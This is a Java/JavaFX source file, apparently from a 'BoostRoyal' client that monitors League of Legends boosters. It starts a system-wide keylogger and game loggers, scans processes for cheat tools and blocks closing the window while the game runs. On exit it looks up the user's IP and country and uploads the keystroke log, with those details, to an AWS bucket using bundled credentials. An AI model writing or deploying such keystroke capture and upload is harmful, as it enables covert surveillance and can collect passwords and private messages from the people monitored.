package view;

import com.google.gson.JsonObject;
import controller.LoginController;
import environment.TaskKiller;
import javafx.application.Platform;
import javafx.event.EventHandler;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.stage.Stage;
import javafx.stage.WindowEvent;
import environment.AccessWindow;
import logger.Globals;
import logger.KeyLogger;
import logger.LolClientLogger;
import logger.LolGameLogger;
import org.jnativehook.NativeHookException;
import org.json.JSONException;
import org.json.JSONObject;
import webService.AWSWebService;

import java.io.*;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Scanner;
import java.util.Timer;
import java.util.TimerTask;

public class Loginer extends javafx.application.Application {
    private static Timer timer = new Timer();

    private LolGameLogger lolGameLogger = LolGameLogger.getInstance();
    private LolClientLogger lolClientLogger = LolClientLogger.getInstance();

    private AccessWindow accessWindow = new AccessWindow();

    private boolean isLolClientRunning = true;
    private boolean isLolGameRunning = false;

    public static boolean foundBadWord = false;
    public static Boolean scriptAlert = false;

    @Override
    public void start(Stage primaryStage) throws IOException, NativeHookException {
        TaskKiller.requestRunningProccesses();
        Platform.setImplicitExit(false);

        primaryStage.setOnCloseRequest(new EventHandler<WindowEvent>() {
            @Override
            public void handle(WindowEvent event) {
                isLolClientRunning = accessWindow.checkIfRunning(Globals.lolClient);
                isLolGameRunning = accessWindow.checkIfRunning(Globals.lolGame);

                if(isLolGameRunning || isLolClientRunning) {
                    event.consume();
                    AlertBox.display("You can't close me", "Sorry dude, you can not close me if lol is running.");
                } else {
                    uploadLog();
                    lolGameLogger.turnOff();
                    lolClientLogger.turnOff();
                    timer.cancel();
                    Platform.exit();
                }
            }
        });

        startApplication(primaryStage);
        readKeys();


        lolGameLogger.turnOn();
        lolClientLogger.turnOn();


        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                System.out.println("dsadsqa");
                ArrayList<String> runningProcesses = TaskKiller.requestRunningProccesses();
                for (String process : runningProcesses) {
                    if(process.contains("BoL Studio.exe") || process.contains("Loader.exe")) {
                        scriptAlert = true;
                    }
                }
            }
        }, 1000, 300000);
    }

    private void startApplication(Stage primaryStage) throws IOException {
        LoginController loginController = new LoginController();
        primaryStage.setTitle("BoostRoyal");
        FXMLLoader loginXML = new FXMLLoader(getClass().getResource("/templates/Login.fxml"));
        loginXML.setController(loginController);
        Parent root = loginXML.load();
        Scene scene = new Scene(root);
        primaryStage.setScene(scene);
        primaryStage.show();
    }

    private void uploadLog() {
        try {
            AWSWebService webService =  new AWSWebService();
            webService.WebService(createLogFile(), createPath());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private String createPath() {
        String path = "";
        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd");
        path += "/" + AWSWebService.folder;
        path += "/" + LocalDate.now() + "/";
        return path;
    }

    private File createLogFile() throws IOException {
        File tempFile = File.createTempFile(createFileName(), ".txt");
        BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(tempFile));
        bufferedWriter.write("The booster's IP adress is: " + getMyIp() + "\n");
        bufferedWriter.write("The booster's Country is:" + getMyCountry() + "\n");
        for (String row : KeyLogger.log) {
            bufferedWriter.write(row);
            bufferedWriter.write(System.getProperty("line.separator"));
        }
        System.out.println(KeyLogger.log);
        System.out.println(getMyIp());
        System.out.println(getMyCountry());
        bufferedWriter.close();

        return tempFile;
    }


    private String createFileName() {
        String fileName = "ASDASDSADSA";
        if(foundBadWord) {
            fileName += "WARNING | ";
        }
        if (scriptAlert) {
            fileName += "SCRIPT ALERT | ";
        }
        return fileName;
    }

    private String getMyIp() {
        try (java.util.Scanner s = new java.util.Scanner(new java.net.URL("https://api.ipify.org").openStream(), "UTF-8").useDelimiter("\\A")) {
            return s.next();
        } catch (java.io.IOException e) {
            return "couldn't find his IP";
        }
    }

    private String getMyCountry() {
        try (java.util.Scanner s = new java.util.Scanner(new java.net.URL("https://usercountry.com/v1.0/json/" + getMyIp()).openStream(), "UTF-8").useDelimiter("\\A")) {
            JSONObject jsonObject = new JSONObject(s.nextLine());
            return jsonObject.get("country").toString();
        } catch (java.io.IOException e) {
            return "couldn't find his Country";
        } catch (JSONException e) {
            e.printStackTrace();
            return "couldn't find his Country";
        }
    }

    private void readKeys() {
        ArrayList<String> keys = new ArrayList<>();
        Scanner scanner = null;
        scanner = new Scanner(ClassLoader.getSystemResourceAsStream("keys.csv"));
        if(scanner != null) {
            while (scanner.hasNext()) {
                keys.add(scanner.nextLine());
            }
            scanner.close();
        }
        AWSWebService.accessKey = keys.get(0);
        AWSWebService.secretKey = keys.get(1);
        AWSWebService.bucketName = keys.get(2);
        AWSWebService.folder = keys.get(3);
    }
}
